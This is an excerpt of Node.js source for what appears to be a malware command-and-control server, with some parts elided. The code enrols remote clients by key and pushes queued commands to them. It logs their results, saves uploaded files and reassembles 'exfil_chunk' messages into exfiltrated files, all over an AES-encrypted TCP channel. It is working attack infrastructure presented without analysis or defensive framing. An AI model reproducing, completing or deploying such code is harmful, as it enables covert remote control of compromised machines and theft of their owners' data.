...
function handleClientMessage(msg, sock, remoteIP, aesKey) {
    if (msg.type === "enroll") {
        if (msg.enrollKey !== config.enrollKey) {
            console.log("[!] Invalid enrollment key from", remoteIP);
            sock.destroy();
            return;
        }
        ...
        dbAll("SELECT * FROM pending_tasks WHERE client_uid=? AND delivered=0", [uid]).then(tasks => {
            for (const t of tasks) {
                sendFramed(sock, { cmd: t.cmd, ...JSON.parse(t.data || "{}") }, aesKey);
                dbRun("UPDATE pending_tasks SET delivered=1 WHERE id=?", [t.id]);
            }
        });
        sock.on("close", () => {
            clients.delete(uid); clientKeys.delete(uid);
            dbRun("UPDATE clients SET online=0, last_seen=? WHERE uid=?", [Date.now(), uid]);
        });
        sock.on("error", () => {
            clients.delete(uid); clientKeys.delete(uid);
            dbRun("UPDATE clients SET online=0 WHERE uid=?", [uid]);
        });
    } else if (msg.type === "result") {
        dbRun("INSERT INTO logs (client_uid, cmd, result, timestamp) VALUES (?,?,?,?)",
            [msg.uid || "unknown", msg.cmd || "unknown", JSON.stringify(msg.output || "").substring(0, 10000), Date.now()]);
        ...
        if (!resolved.startsWith(uploadsDir)) { console.error("[!] Path traversal blocked"); return; }
        ...
        dbRun("INSERT INTO files (client_uid, filename, filepath, filesize, file_type, timestamp) VALUES (?,?,?,?,?,?)",
            [msg.uid, safeFilename(msg.name), fpath, msg.size || 0, msg.file_type || "file", Date.now()]);
    } else if (msg.type === "exfil_chunk") {
        const sessionKey = msg.uid + "_" + msg.session;
        if (!exfilSessions.has(sessionKey)) exfilSessions.set(sessionKey, { uid: msg.uid, cmd: msg.cmd, fileType: msg.file_type, chunks: new Array(msg.total), total: msg.total });
        ...
        if (session.chunks.filter(c => c !== undefined).length === session.total) {
            ...
            dbRun("INSERT INTO files (client_uid, filename, filepath, filesize, file_type, timestamp) VALUES (?,?,?,?,?,?)",
                [session.uid, fname, fpath, decompressedData.length, session.fileType, Date.now()]);
...
function startTcpServer() {
    ...
    const server = net.createServer((sock) => {
        ...
        activeConnections++;
        sock.on("close", () => activeConnections--);
        const remoteIP = sock.remoteAddress.replace("::ffff:", "");
        let keyExchanged = false;
        sock.setTimeout(config.handshakeTimeoutMs, () => {
            if (!keyExchanged) sock.destroy();
        });
        performKeyExchange(sock, (aesKey, leftover) => {
            ...
            const processFrames = () => {
                while (frameBuffer.length >= 4) {
                    ...
                    if (expectedLen > config.maxFrameSize) {
                        console.error("[!] Oversized frame from", remoteIP, "- closing");
                        sock.destroy();
                        return;
                    }
                    ...
                    try {
                        const decrypted = aesDecrypt(encryptedPayload, aesKey);
                        const msg = JSON.parse(decrypted.toString());
                        handleClientMessage(msg, sock, remoteIP, aesKey);
                    } catch (e) { console.error("Parse error:", e.message); }
                }
            };
            sock.on("data", (rawChunk) => {
                frameBuffer = Buffer.concat([frameBuffer, rawChunk]);
                processFrames();
            });
            if (leftover && leftover.length > 0) {
                frameBuffer = leftover;
                processFrames();
            }
        });
    });
